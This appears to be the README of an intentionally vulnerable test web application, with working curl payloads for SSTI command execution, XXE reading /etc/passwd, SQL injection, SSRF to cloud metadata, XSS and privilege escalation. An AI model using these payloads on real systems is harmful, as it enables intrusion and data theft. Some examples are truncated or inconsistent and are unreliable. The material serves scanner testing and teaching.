## Vulnerabilities Overview

- **Broken JWT Authentication** - The application includes multiple endpoints that generate and validate several types of JWT tokens. The main login API, used by the UI, is utilizing one of the endpoints while others are available via direct call and described in Swagger.

  - **No Algorithm bypass** - Bypasses the JWT authentication by using the “None” algorithm (implemented in main login and API authorization code).
  - **RSA to HMAC** - Changes the algorithm to use a “HMAC” variation and signs with the public key of the application to bypass the authentication (implemented in main login and API authorization code).
  - **Invalid Signature** - Changes the signature of the JWT to something different and bypasses the authentication (implemented in main login and API authorization code).
  - **KID Manipulation** - Changes the value of the KID field in the Header of JWT to use either: (1) a static file that the application uses or (2) OS Command that echoes the key that will be signed or (3) SQL code that will return a key that will be used to sign the JWT (implemented in designated endpoint as described in Swagger).
  - **Brute Forcing Weak Secret Key** - Checks if common secret keys are used (implemented in designated endpoint as described in Swagger). The secret token is configurable via .env file and, by default, is 123.
  - **X5U Rogue Key** - Uses the uploaded certificate to sign the JWT and sets the X5U Header in JWT to point to the uploaded certificate (implemented in designated endpoint as described in Swagger).
  - **X5C Rogue Key** - The application doesn't properly check which X5C key is used for signing. When we set the X5C headers to our values and sign with our private key, authentication is bypassed (implemented in designated endpoint as described in Swagger).
  - **JKU Rogue Key** - Uses our publicly available JSON to check if JWT is properly signed after we set the Header in JWT to point to our JSON and sign the JWT with our private key (implemented in designated endpoint as described in Swagger).
  - **JWK Rogue Key** - We make a new JSON with empty values, hash it, and set it directly in the Header, and we then use our private key to sign the JWT (implemented in designated endpoint as described in Swagger).

- **Brute Force Login** - Checks if the application user is using a weak password. The default setup contains user = _admin_ with password = _admin_
  <details>
    <summary>Example Exploitation</summary>

  To demonstrate brute force login, you can use the following `curl` command:

  ```bash
  $ curl http://localhost:3000/api/auth/login \
  >   -H 'Content-Type: application/json' \
  >   -d '{"user":"admin","password":"admin","op":"basic"}'
  {"email":"admin","ldapProfileLink":"(&(objectClass=person)(objectClass=user)(email=admin))"}
  ```

  </details>

- **Common Files** - Tries to find common files that shouldn’t be publicly exposed (such as “phpinfo”, “.htaccess”, “ssh-key.priv”, etc…). The application contains .htaccess and nginx.conf files under the client's root directory and additional files can be added by placing them under the public/public directory and running a build of the client.
  <details>
    <summary>Example Exploitation of Common Files</summary>

  To demonstrate accessing a common file, you can use the following `curl` command:

  ```bash
  curl http://localhost:3000/.htaccess
  ```

  Response:

  ```text

  RewriteCond %{REQUEST_FILENAME} !-d
  RewriteCond %{REQUEST_FILENAME}\.php -f
  RewriteRule ^(.*)$ $1.php

  ```

  </details>

- **Cookie Security** - Checks if the cookie has the “secure” and HTTP only flags. The application returns two cookies (session and bc-calls-counter cookie), both without secure and HttpOnly flags.

- **Cross-Site Request Forgery (CSRF)**

  - Checks if a form holds anti-CSRF tokens, misconfigured “CORS” and misconfigured “Origin” header - the application returns "Access-Control-Allow-Origin: \*" header for all requests. The behavior can be configured in the /main.ts file.
  - The same form with both authenticated and unauthenticated user - the _Email subscription_ UI forms can be used for testing this vulnerability.
    <details>
      <summary>Example of Misconfigured CORS</summary>

    ![Example of Misconfigured CORS](docs/cors.gif)

    </details>

  - Different form for an authenticated and unauthenticated user - the _Add testimonial_ form can be used for testing. The forms are only available to authenticated users.

- **Cross-Site Scripting (XSS)** -

  - **Reflective XSS** There are couple of endpoints that are vulnerable to reflective XSS:

    - Landing page with the _dummy_ query param that contains DOM content (including script), add the provided DOM will be injected into the page and script executed.
    - Landing page maptitle param that contains DOM content (including script), add the provided DOM will be injected into the page and script executed.
    - /api/testimonials/count page count param is vulnerable to reflective XSS.
    - POST to http://localhost:3000/api/metadata with body XML body vulnarable for reflective XSS.
    - POST to http://localhost:3000/api/metadata with body SVG body vulnarable for reflective XSS.

    <details>
      <summary>Reflective XSS Example Exploitation</summary>

    To demonstrate reflective XSS, you can use the following payloads:

    1. **Landing Page Dummy Query Parameter**:

       - URL: `http://localhost:3000/?__dummy=__<script>alert('XSS')</script>`
       - The `dummy` query parameter is directly injected into the DOM without sanitization, causing the script to execute.

    2. **Landing Page Map Title Parameter**:

       - URL: `http://localhost:3000/?maptitle=<script>alert('XSS')</script>`
       - The `maptitle` parameter is used in the DOM and allows script execution.

    3. **Testimonials Page Count Parameter**:
       - URL: `http://localhost:3000/api/testimonials/count?query=<script>alert('XSS')</script>`
       - The `query` parameter is reflected in the response without sanitization, allowing script execution.
    4. **POST to /api/metadata with XML Body**:
       - URL: `http://localhost:3000/api/metadata`
       - Body: `<?xml version="1.0" encoding="UTF-8"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">prompt("bright986352")</x:script><child></child>`
       - The XML body is processed and the script is executed in the response.
    5. **POST to /api/metadata with SVG Body**:
       - URL: `http://localhost:3000/api/metadata`
       - Body: `<svg xmlns="http://www.w3.org2000/svg" xmlns:xlink="http://www.w3.org1999/xlink" viewBox="0 0 915 585"><g<x:script xmlns:x="http://www.w3.org/1999/xhtml">prompt("bright443188")</`

    </details>

  - **Persistent XSS** can be demonstrated using add testimonial form on the landing page (for authenticated users only).

    <details>
      <summary>Persistent XSS Example Exploitation</summary>

    To demonstrate persistent XSS, you can use the following steps:

    1. Submit the following `curl` request to store the XSS payload:

       ```bash
       curl 'http://localhost:3000/api/testimonials' -X POST \
       -H 'authorization: AUTH_TOKEN' \
       -H 'Content-Type: application/json' \
       --data-raw '{"name":"Test User","title":"Test Title","message":"<script>alert(12345)</script>"}'
       ```

    2. Visit the testimonials page at `http://localhost:3000/marketplace` to observe the execution of the XSS payload.

    </details>

  - **DOM Cross-Site Scripting** - can be demonstrated by using the mailing list subscription form on the landing page. The form sends a POST request to `/api/subscriptions?email=VALUE`, and the server's response is embedded into the page without any validation on either the server or client side. This allows an attacker to inject malicious scripts into the page.
    <details>
      <summary>Example Exploitation</summary>

    To demonstrate this vulnerability, you can submit the following payload in the email field of the subscription form:

    ```html
    <script>
      alert('XSS');
    </script>
    ```

    Brobser perform a POST request to `/api/subscriptions?email=<script>alert("XSS")</script>'` with the payload in the email field.
    The server's response will include the injected script, which will be embedded into the page and executed by the browser. This can be used to execute arbitrary JavaScript code in the context of the user's session.

    Example:
    ![Example of DOM XSS Exploitation](docs/bc_dom_xss.gif)

    </details>

- **Default Login Location** - The login endpoint is available under /api/auth/login.

- **Directory Listing** - The Nginx config file under the nginx-conf directory is configured to allow directory listing.

  <details>
    <summary>Example Exploitation of Directory Listing</summary>

  To demonstrate directory traversal, you can use the following `curl` command:

  ```bash
  curl http://localhost:3000/vendor/
  ```

  Example Response:

  ```html
  <head>
    <title>Index of /vendor/</title>
  </head>
  <html>
    <body>
      <h1>Index of /vendor/</h1>
      <hr />
      <table style="width: max(450px, 50%);">
        <tr>
          <td>
            <a href="/">../</a>
          </td>
          <td></td>
          <td></td>
        </tr>
        <tr>
          <td>
            <a href="/vendor/bootstrap-4.1">bootstrap-4.1</a>
          </td>
          <td>4/7/2025, 8:33:43 AM</td>
        </tr>
        ...
      </table>
    </body>
  </html>
  ```

    </details>

- **File Upload** - The application allows uploading an avatar photo of the authenticated user. The server doesn't perform any sort of validation on the uploaded file.
  <details>
    <summary>Example of No Anti-Virus Protection</summary>

  Uploading an EICAR test file with the file extension changed to "exe":

  ```bash
  curl -i 'https://qa.demon-slayers.local/api/users/one/admin/photo' \
    -X PUT \
    -H 'authorization: AUTH_TOKEN' \
    -H 'Content-Type: multipart/form-data; boundary=--------------------------296987379026085658617195' \
    --data-binary $'----------------------------296987379026085658617195\r\nContent-Disposition: form-data; name="admin"; filename="sample-img2ee0.exe"\r\nContent-Type: image/png\r\n\r\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\r\n----------------------------296987379026085658617195--\r\n'
  ```

  The response indicates successful upload:

  ```
  HTTP/2 200
  ```

  Successfully fetching the file shows that the server stored the file:

  ```bash
  $ curl -i 'https://qa.demon-slayers.local/api/users/one/admin/photo' -H 'authorization: AITH_TOKEN'
  HTTP/2 200

  ```

  </details>

- **Full Path Disclosure** - An error returned by the server includes the full path of the file where the error has occurred. The error can be triggered by passing a specially crafted value as a parameter.
  <details>
    <summary>Example of Full Path Disclosure</summary>
    ```bash
    curl  -H "x-product-name: Opal'" https://qa.demon-slayers.local/api/products/views
    ```
    Response:
    ```json
    {
      "error": "UPDATE product SET views_count = views_count + 1 WHERE name = 'Opal'' - unterminated quoted string at or near \"'Opal''\"",
      "location": "/usr/src/app/dist/products/products.controller.js"
    }
    ```
    The location field in the JSON response reveals the full internal file path: /usr/src/app/dist/products/products.controller.js. This is sensitive information that should not be exposed to users, as it provides insights into the server's directory structure.
  </details>

- **Headers Security Check** - The application is configured with misconfigured security headers. The list of headers is available in the headers.configurator.interceptor.ts file. A user can pass the _no-sec-headers_ query param to any API to prevent the server from sending the headers.

- **HTML Injection** - Both forms testimonial and mailing list subscription forms allow HTML injection.
  <details>
    <summary>Example of HTML Injection</summary>

  ![Example of HTML Injection](docs/htmli.gif)

  </details>

- **CSS Injection** - The login page is vulnerable to CSS Injections through a URL parameter: http://localhost:3000/userlogin?logobgcolor=transparent.
  <details>
    <summary>Example of CSS Injection</summary>
    ![Example of CSS Injection](docs/css_injection.gif)
  </details>

- **HTTP Method fuzzer** - The server supports uploading, deletion, and getting the content of a file via /put.raw addition to the URL. The actual implementation using a regular upload endpoint of the server and the /put.raw endpoint is mapped in Nginx.

- **LDAP Injection** - The login request returns an LDAP query for the user's profile, which can be used as a query parameter in /api/users/ldap _query_ query parameter. The returned query can be modified to search for other users. If the structure of the LDAP query is changed, a detailed LDAP error will be returned (with LDAP server information and hierarchy).
  <details>
    <summary>LDAP Injection Example Exploitation</summary>

  ```bash
  curl "http://localhost:3000/api/users/ldap?query=%28%26%28objectClass%3Dperson%29%28objectClass%3Duser%29%28email%3D%2A%29%29"
  ```

  This is a URI-encoded version of the following query:

  ```text
  http://localhost:3000/api/users/ldap?query=(&(objectClass=person)(objectClass=user)(email=*))
  ```

  The query retrieves information about all users with an email address, using the wildcard `*` to match any email. This demonstrates how the endpoint can be exploited to extract sensitive information from the LDAP directory.

  </details>

- **Local File Inclusion (LFI)** - The /api/files endpoint returns any file on the server from the path that is provided in the _path_ param. The UI uses this endpoint to load crystal images on the landing page.

  <details>
    <summary>Example Exploitation</summary>

  To demonstrate file disclosure, you can use the following `curl` commands:

  1.  Accessing the `/etc/hosts` File with GET /api/file/raw

      ```bash
      curl http://localhost:3000/api/file/raw\?path\=/etc/hosts
      ```

      Example Response:

      </details>

- **Mass Assignment** - You can add to user admin privileges upon creating user or updating userdata. When you are creating a new user /api/users/basic you can use additional hidden field in body request { ... "isAdmin" : true }. If you are trying to edit userdata with PUT request /api/users/one/{email}/info you can add this additional field mentioned above. For checking admin permissions there is one more endpoint: /api/users/one/{email}/adminpermission.
  <details>
    <summary>Hidden Field Exploitation for Privilege Escalation</summary>
      1. Creating a Regular User

      ```bash
      curl 'http://localhost:3000/api/users/basic' -X POST \
        -H 'Content-Type: application/json' \
        --data-raw '{"email":"regular_user","firstName":"John","lastName":"Doe","company":"Test","cardNumber":"123","phoneNumber":"555-1234","password":"password123","op":"basic"}'
      ```

      2. Login as Regular User

      ```bash
      curl 'http://localhost:3000/api/auth/login' -X POST \
        -H 'Content-Type: application/json' \
        --data-raw '{"user":"regular_user","password":"password123","op":"basic"}'
      ```

      The response will contain an authorization token:

      ```
      {"auth-token":"eyJ0eXAiOiJKV1QiLCJhbGci..."}
      ```

      3. Verify No Admin Permissions for Regular User

      ```bash
      curl 'http://localhost:3000/api/users/one/regular_user/adminpermission' \
        -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGci...'
      ```

      Response returns `false`, indicating no admin permissions.

      4. Creating a User with Admin Privileges (Exploiting the Vulnerability)

      ```bash
      curl 'http://localhost:3000/api/users/basic' -X POST \
        -H 'Content-Type: application/json' \
        --data-raw '{"isAdmin":true,"email":"admin_user","firstName":"Admin","lastName":"User","company":"Test","cardNumber":"123","phoneNumber":"555-5678","password":"password123","op":"basic"}'
      ```

      5. Login as Admin User

      ```bash
      curl 'http://localhost:3000/api/auth/login' -X POST \
        -H 'Content-Type: application/json' \
        --data-raw '{"user":"admin_user","password":"password123","op":"basic"}'
      ```

      This will return another authorization token for the admin user.

      6. Verify Admin Permissions for the Admin User

      ```bash
      curl 'http://localhost:3000/api/users/one/admin_user/adminpermission' \
        -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGci...'
      ```

      Response returns `true`, confirming admin permissions have been granted.

  </details>

- **Open Database** - The index.html file includes a link to manifest URL, which returns the server's configuration, including a DB connection string.

- **Server-Side Template Injection (SSTI)** - The endpoint /api/render receives a plain text body and renders it using the doT (http://github.com/olado/dot) templating engine.
  <details>
    <summary>Server-Side Template Injection (SSTI) Example Exploitation</summary>

  To demonstrate an SSTI attack, you can use the following `curl` command:

  ```bash
  curl 'http://localhost:3000/api/render' -X POST -H 'Content-Type: text/plain' \
  --data-raw "{{= global.process.mainModule.require('child_process').execSync('ls -la /home') }}"
  ```

  The response includes a result of code execution - lising /home dir

  ```

  </details>

- **Server-Side Request Forgery (SSRF)** - The endpoint /api/file receives the _path_ and _type_ query parameters and returns the content of the file in _path_ with Content-Type value from the _type_ parameter. The endpoint supports relative and absolute file names, HTTP/S requests, as well as metadata URLs of Azure, Google Cloud, AWS, and DigitalOcean.
  There are specific endpoints for each cloud provider as well - `/api/file/google`, `/api/file/aws`, `/api/file/azure`, `/api/file/digital_ocean`.
  <details>
    <summary>Example Exploitation of Server-Side Request Forgery (SSRF)</summary>

  To demonstrate SSRF, you can use the following `curl` commands:

  1. **Triggering a Request to an External Resource**:

     ```bash
     curl 'http://localhost:3000/api/file?path=https://httpbin.org/get'
     ```

     Example Response:

     ```json
     {
       "args": {},
       "headers": {
         "Accept": "application/json, text/plain, */*",
         "Accept-Encoding": "gzip, compress, deflate, br",
         "Host": "httpbin.org",
         "User-Agent": "axios/1.7.7",
         "X-Amzn-Trace-Id": "Root=1-67ea5603-2599f0b04e318fa9241a659d"
       },
       "origin": "18.212.149.236",
       "url": "https://httpbin.org/get"
     }
     ```

     This demonstrates that the server can be used to make requests to external resources.

  2. **Triggering a Request to an Internal Network Resource**:

     ```bash
     curl 'http://localhost:3000/api/file?path=http://169.254.169.254/latest/meta-data/ami-id'
     ```

     Example Response:

     ```text
     ami-id
     ami-launch-index
     ami-manifest-path
     block-device-mapping/
     events/
     hostname
     iam/
     instance-action
     instance-id
     instance-life-cycle
     instance-type
     local-hostname
     local-ipv4
     mac
     metrics/
     network/
     placement/
     profile
     public-hostname
     public-ipv4
     public-keys/
     reservation-id
     security-groups
     services/%
     ```

     This demonstrates that the server can access internal network resources, which could expose sensitive information.

  </details>

- **SQL injection (SQLi)** - The `/api/testimonials/count` endpoint receives and executes SQL query in the query parameter. Similarly, the `/api/products/views` endpoint utilizes the `x-product-name` header to update the number of views for a product. However, both of these parameters can be exploited to inject SQL code, making these endpoints vulnerable to SQL injection attacks.
  <details>
    <summary>SQL Injection Example Exploitation</summary>

  To demonstrate an SQL injection attack, you can use the following `curl` commands:

  ```bash
  $ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "http://localhost:3000/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(5)--"
  Total time: 5.687800 seconds
  ```

  This command injects a SQL query that causes the database to sleep for 5 seconds. The total time taken for the request indicates that the SQL injection was successful.

  ```bash
  $ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "http://localhost:3000/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(1)--"
  Total time: 1.691999 seconds
  ```

  Similar to the previous command, this one causes the database to sleep for 1 second, demonstrating the ability to manipulate the database's behavior through SQL injection.

  ```bash
  $ curl http://localhost:3000/api/testimonials/count?query=select%20count%28table_name%29%20as%20count%20from%20information_schema.tables
  214
  ```

  This command retrieves the count of tables in the database's information schema, showing that the injected SQL query can access and extract data from the database.

  ```
  </details>

  ```

- **Unvalidated Redirect** - The endpoint /api/goto redirects the client to the URL provided in the _url_ query parameter. The UI references the endpoint in the header (while clicking on the site's logo) and as a href source for the Terms and Services link in the footer.
  <details>
    <summary>Unvalidated Redirect Example Exploitation</summary>

  To demonstrate an unvalidated redirect attack, you can use the following `curl` command:

  ```bash
  $ curl -I "https://qa.demon-slayers.local/api/goto?url=https://example.com"
  HTTP/1.1 302 Found
  Location: https://malicious-site.com
  ```

  </details>

- **Version Control System** - The client_s build process copies SVN, GIT, and Mercurial source control directories to the client application root, and they are accessible under Nginx root.
  <details>
    <summary>Version Control System Example Exploitation</summary>

  To demonstrate the exposure of version control system files, you can use the following `curl` commands:

  1. **Accessing Git Configuration**:

     ```bash
     curl http://localhost:3000/.git/config
     ```

     Example Response:

     ```text
     [core]
         repositoryformatversion = 0
         filemode = true
         bare = false
         logallrefupdates = true
         ignorecase = true
         precomposeunicode = true
     ```

  2. **Accessing Mercurial Requirements**:

     ```bash
     curl http://localhost:3000/.hg/requires
     ```

     Example Response:

     ```text
     dotencode
     fncache
     generaldelta
     revlogv1
     sparserevlog
     store
     ```

  These responses indicate that the version control system files are publicly accessible, which can expose sensitive information about the repository.

  </details>

- **XML External Entity (XXE)** - The endpoint, POST /api/metadata, receives URL-encoded XML data in the _xml_ query parameter, processes it with enabled external entities (using `libxmljs` library) and returns the serialized DOM. Additionally, for a request that tries to load file:///etc/passwd as an entity, the endpoint returns a mocked up content of the file.
  <details>
    <summary>XXE Example Exploitation</summary>

  Additionally, the endpoint PUT /api/users/one/{email}/photo accepts SVG images, which are processed with libxml library and stored on the server, as well as sent back to the client.

  To demonstrate an XXE attack, you can use the following `curl` command:

  ```bash
  curl 'http://localhost:3000/api/metadata' -X POST -H 'Content-Type: text/xml' \
   --data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY nexploit_xxe SYSTEM "file://etc/passwd">]> <root> &nexploit_xxe; </root>'
  ```

  The response containse servers file://etc/passwd content

  ```

  To demonstrate the issue, you can refer to the following example:

  ![Example of bac.gif Demonstration](docs/bac.gif)

    </details>

- **Broken Function Level Authorization** - The endpoint DELETE `/users/one/:id/photo?isAdmin=` can be used to delete any user's profile photo by enumerating the user IDs and setting the `isAdmin` query parameter to true, as there is no validation of it's value on the server side.

- **IFrame Injection** - The `/marketplace` page a URL parameter `videosrc` which directly controls the src attribute of the IFrame at the bottom of this page. Similarly, the home page takes a URL param `maptitle` which directly controls the `title` attribute of the IFrame at the CONTACT section of this page.

- **Excessive Data Exposure** - visiting the page `http://localhost:3000/adminpage` reveals a list of registered users, including their First Name, Last Name, Email, and Company. Observing the background traffic, a `GET /api/users/search/` request is made, and the response contains sensitive data such as `cardNumber` and `phoneNumber`.

  This response exposes sensitive information, such as credit card numbers and phone numbers, which should not be accessible through this endpoint.

- **Business Constraint Bypass** - The `/api/products/latest` endpoint supports a `limit` parameter, which by default is set to 3. The `/api/products` endpoint is a password protected endpoint which returns all the products, yet if you change the `limit` param of `/api/products/latest` to be high enough you could get the same results without the need to be authenticated.
  <details>
    <summary>Example Exploitation of Business Constraint Bypass</summary>

  ```bash
  # Normal request that returns only 3 latest products
  curl http://localhost:3000/api/products/latest

  # Bypassing the constraint to get all products without authentication
  curl http://localhost:3000/api/products/latest?limit=1000
  ```

  </details>

- **ID Enumeration** - There are a few ID Enumeration vulnerabilities:

  1. The endpoint DELETE `/users/one/:id/photo?isAdmin=` which is used to delete a user's profile picture is vulnerable to ID Enumeration together with [Broken Function Level Authorization](#broken-function-level-authorization).
  2. The `/users/id/:id` endpoint returns user info by ID, it doesn't require neither authentication nor authorization.

- **XPATH Injection** - The `/api/partners/*` endpoint contains the following XPATH injection vulnerabilities:

  1. The endpoint GET `/api/partners/partnerLogin` is supposed to log in with the user's credentials in order to obtain account info. It's vulnerable to an XPATH injection using boolean based payloads. When exploited it'll retrieve data about other users as well. You can use `' or '1'='1` in the password field to exploit the EP.
  2. The endpoint GET `/api/partners/searchPartners` is supposed to search partners' names by a given keyword. It's vulnerable to an XPATH injection using string detection payloads. When exploited, it can grant access to sensitive information like passwords and even lead to full data leak. You can use `')] | //password%00//` or `')] | //* | a[('` to exploit the EP.
  3. The endpoint GET `/api/partners/query` is a raw XPATH injection endpoint. You can put whatever you like there. It is not referenced in the frontend, but it is an exposed API endpoint.
  4. Note: All endpoints are vulnerable to error based payloads.

  <details>
    <summary>Example Exploitation of XPATH Injection</summary>

  To demonstrate an XPATH injection attack, you can use the following `curl` command:

  ```bash
  $ curl "http://localhost:3000/api/partners/partnerLogin?user=anyuser&password=%27%20or%20%271%27%3D%271"
  ```

  </details>

- **Prototype Pollution** - The `/marketplace` endpoint is vulnerable to prototype pollution using the following methods:

  1. The EP GET `/marketplace?__proto__[Test]=Test` represents the client side vulnerability, by parsing the URI (for portfolio filtering) and converting
     its parameters into an object. This means that a requests like `/marketplace?__proto__[TestKey]=TestValue` will lead to a creation of `Object.TestKey`.
     One can test if an attack was successful by viewing the new property created in the console.
     This EP also supports prototype pollution based DOM XSS using a payload such as `__proto__[prototypePollutionDomXss]=data:,alert(1);`.
     The "legitimate" code tries to use the `prototypePollutionDomXss` parameter as a source for a script tag, so if the exploit is not used via this key it won't work.
  2. The EP GET `/api/email/sendSupportEmail` represents the server side vulnerability, by having a rookie URI parsing mistake (similar to the client side).
     This means that a request such as `/api/email/sendSupportEmail?name=Bob%20Dylan&__proto__[status]=222&to=username%40email.com&subject=Help%20Request&content=Help%20me..`
     will lead to a creation of `uriParams.status`, which is a parameter used in the final JSON response.

- **Date Manipulation** - The `/api/products?date_from={df}&date_to={dt}` endpoint fetches all products that were created between the selected dates. There is no limit on the range of dates and when a user tries to query a range larger than 2 years querying takes a significant amount of time. This EP is used by the frontend in the `/marketplace` page.
  <details>
    <summary>Example Exploitation of Date Manipulation</summary>

  To demonstrate the issue, you can use the following `curl` commands:

  1. **Querying a Short Date Range**:

     ```bash
     time curl 'http://localhost:3000/api/products?date_from=11-04-2024&date_to=12-04-2025' \
     -H 'authorization: YOUR_AUTH_HEADER'
     ```

     Response:

- **Email Injection** - The `/api/email/sendSupportEmail` is vulnerable to email injection by supplying tempered recipients.
  To exploit the EP you can dispatch a request as such `/api/email/sendSupportEmail?name=Bob&to=username%40email.com%0aCc:%20bob@domain.com&subject=Help%20Request&content=I%20would%20like%20to%20request%20help%20regarding`.
  This will lead to the sending of a mail to both `username@email.com` and `bob@domain.com` (as the Cc).
  Note: This EP is also vulnerable to `Server side prototype pollution`, as mentioned in this README.

- **Insecure Output Handling** - The `/chat` route is vulnerable to insecure output handling, where the LLM response is not properly sanitized before being rendered. This can lead to the execution of malicious scripts if the response contains unsanitized HTML or JavaScript.
